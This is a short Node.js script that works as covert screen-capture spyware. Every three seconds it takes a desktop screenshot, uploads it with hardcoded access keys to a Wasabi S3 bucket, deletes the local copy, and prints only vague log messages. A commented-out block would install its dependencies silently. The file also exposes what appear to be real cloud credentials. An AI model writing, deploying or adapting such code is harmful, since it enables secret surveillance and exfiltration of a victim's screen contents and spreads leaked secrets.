
let count = 0


// exec('npm install screenshot-desktop aws-sdk', (error, stdout, stderr) => {
//   if (error) {
//     console.error(`npm install error: ${error}`);
//     return;
//   }
//   // console.log(`npm install stdout: ${stdout}`);
//   // console.error(`npm install stderr: ${stderr}`);
//   console.log('done')
// });

const { exec } = require('child_process');
const screenshot = require('screenshot-desktop')
const AWS = require('aws-sdk');
const fs = require('fs');
const { Console } = require('console');

setInterval(shotDone,3000)

async function  shotDone(){


await screenshot({ filename: `ss.jpg` }).then((imgPath) => {
    // imgPath: absolute path to screenshot
    // created in current working directory named shot.png
  });


const s3 = new AWS.S3({
  endpoint: 's3.wasabisys.com', // Wasabi API endpoint
  accessKeyId: 'TJL64GSBDT75X3XL8KJY',
  secretAccessKey: 'QcAVSduKzFoW80yPyJsU2X0GPhVPSTclUqpejCiI'
});

const uploadParams = {
  Bucket: 'screenshots123',
  Key: `ss${count}.jpg`, // The name you want the file to have in Wasabi
  Body: fs.createReadStream(`ss.jpg`) // The path to your local file
};

await s3.upload(uploadParams, (err, data) => {
  if (err) {
    // console.error('Error uploading file:', err);
    console.log('uhum')
  } else {
    // console.log('File uploaded successfully:', data.Location);
    console.log('hmm')
  }
});

 fs.unlink(`ss.jpg`, (err) => {
  if (err) {
    console.error('Error deleting file:', err);
  } else {
    // console.log('File deleted successfully');
    console.log('umm')
  }
});
 count++
}
